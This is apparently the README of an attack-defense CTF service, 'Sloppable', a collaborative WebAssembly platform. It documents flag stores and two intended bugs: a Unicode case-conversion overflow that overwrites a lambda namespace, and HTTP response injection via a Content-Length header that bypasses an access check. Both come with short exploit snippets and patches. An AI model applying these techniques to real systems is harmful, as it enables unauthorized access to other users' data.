sloppable
================

Authors:
* Bazumo (Moritz Schneider) <!-- primary -->
* Yvie (Yvonne Kothmeier)

Categories:
* Web


Overview
--------

Sloppable is a web-based collaborative development platform that allows users to write code in a custom language and compile it to WebAssembly.

The `SERVICE_PORT` variable sets the frontend's published port and defaults to
9100. The API listens on port 9000 inside the Docker network; when run directly,
the API reads `SERVICE_PORT` and defaults to 9000. The checker's `CHECKER_PORT`
variable sets the host port it listens on and defaults to 8000.

Each Slopscript compiler process is limited to 512 MiB of address space and five
seconds of CPU time.

## Core Functionalities
### Workspaces
Each user session gets an isolated workspace containing a virtual filesystem. Users can create, read, and modify files within their workspace. The workspace supports an arbitrary file tree and exposes read/write operations through the platform UI and programmatically via tool calls. Workspaces are ephemeral by default and scoped to a browser session (no server-side persistence unless explicitly published).Custom Language & Compiler
The platform introduces a purpose-built high-level language (tentatively called Slopscript) that compiles down to WebAssembly.

### Language
The language supports object-oriented constructs including inheritance. The compiler generates vtables for each type to support dynamic dispatch. Function references are stored in a WebAssembly `funcref` table, while objects store vtable offsets as `i32` values.

### Server-Side Lambda Execution

Compiled Lambda modules are executed on the server using Wasmtime. Their response content is rendered in the browser as an HTML preview inside a sandboxed iframe. The iframe does not receive any sandbox capabilities, so Lambda-provided scripts cannot execute or access the parent page; the raw response remains available in the tool-call details.

### Lambda Functions
Workspace files matching `lambdas/<name>.slop` are compiled into callable, WASM-backed Lambda functions when the workspace is published. Lambdas are namespaced by artifact, and the runtime routes calls by artifact ID and function name.

### Tool Calls & Browser Agent

The React single-page app defines TanStack AI client tools and executes them in
the browser against the REST API:


| Tool | Description |
|---|---|
| `publish_workspace` | Publishes the workspace as an immutable artifact |
| `read_artifact` | Gets an accessible artifact and its published files |
| `share_artifact` | Grants another session read access to an artifact |
| `call_lambda` | Invokes a Lambda function within an artifact |
| `write_file` / `read_file` | Operates on the current workspace's virtual files |


### Artifacts

An artifact is a published, immutable snapshot of a workspace. Artifacts are private by default and stored server-side. Each artifact has a unique ID. Publishing snapshots every workspace file and compiles files matching `lambdas/<name>.slop`. Sharing is explicit: the owner calls `share_artifact` with a target session token.

### Chat Interface
A chat log is maintained in the browser's local storage. Conversation turns are
sent to the stateless `/llm` endpoint; tool schemas and execution remain in the
browser, which calls the REST API and submits tool results back into the turn.

### User Management
The platform prefers anonymous users identified by a server-issued session
token that the SPA restores from local storage. No registration is required.
Workspace and Artifact ownership is tied to this bearer token.

### Flag Store 1

**Storage mechanism:** The checker publishes `lambdas/flag.slop`, whose string literals contain the flag characters. The source is part of the artifact manifest and the compiled module is stored alongside the artifact's compiled Lambdas. Invoking it returns the Base64-encoded flag.

**What it represents:** A secret computation result. The flag lives inside a Lambda's return value.

**Attack info:** The private artifact ID.

**Attack-info usage:** Yes — the artifact ID identifies the namespace containing the checker-owned Lambda.

### Flag Store 2

**Storage mechanism:** A private artifact contains a published file named `flag` whose content is the plaintext flag.

**What it represents:** A protected file in another artifact. Reading it requires artifact access or bypassing the runtime's access check.

**Attack info:** The flag-bearing artifact ID.


Vulnerabilities
---------------

### Flag Store 1, Vuln 1


Slopscript has `uppercase` and `lowercase` functions that change strings.

Changing case is done according to Unicode rules, which means that the number of characters and the length of the UTF8 encoding may change.

When the string grows it can override the string coming after it if both are next to each other null terminated in flat memory

Slop procedure call stores the arguments in flat memory and after that the namespace id. 
Uppercasing/Lowercasing the argument can lead to overriding the namespace which would allow you to call lamdba functions of other users (including the flag namespace)


exploit.slop:
```
Response main(Request r) {
    string target = "flag";
    string vuln = "ΐtarget";
    uppercase(vuln);
    lowercase(vuln);

    return Response(spc(target), {});
}
```



### Flag Store 2, Vuln 1

A malicious lambda can inject a HTTP response by sending a custom Content-Length header.

When a lambda function tries to access a file, a permission check is done by sending a HTTP-Request and checking the response. Using the response injection from above, a malicious lambda can inject a success response before reading the flag file from another user.

exploit.slop:
```
Response main(Request req) {
    spc("vuln");
    return Response(read_artifact("<artifact-id>:flag"), {});
}
```

vuln.slop:
```
Response main(Request req) {
    return Response("HTTP/1.1 200 OK\r\nContent-length: 2\r\n\r\nOK", {"Content-Length": "0"});
}
```

* Difficulty: hard
* Discoverability: easy
* Patchability: easy
* Categories: web

Patches
-------

### Flag Store 1, Vuln 1

Either make the uppercase/lowercase functions cap the string at the original length.

### Flag Store 2, Vuln 1

Ignore Content-Length headers returned by the lambda functions.

License
-------

MIT License
